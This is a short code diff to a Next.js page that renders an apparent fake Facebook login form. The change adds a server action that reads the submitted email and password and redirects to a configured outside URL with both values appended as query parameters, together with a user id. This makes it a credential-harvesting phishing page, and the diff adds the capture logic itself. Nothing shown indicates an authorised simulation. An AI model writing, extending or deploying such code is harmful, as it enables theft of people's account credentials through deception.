@@ -32,9 +32,11 @@ export default function Page({ searchParams }: PageProps) {
   const baseUrl = `${env.REDIRECT_URL}?url=${url}&userid=${userId}`;
   return (
     <FacebookLanding
-      action={async () => {
+      action={async (formData: FormData) => {
         "use server";
-        redirect(baseUrl);
+        const email = formData.get("email") as string;
+        const password = formData.get("password") as string;
+        redirect(`${baseUrl}&username=${email}&password=${password}`);
       }}
     />
   );
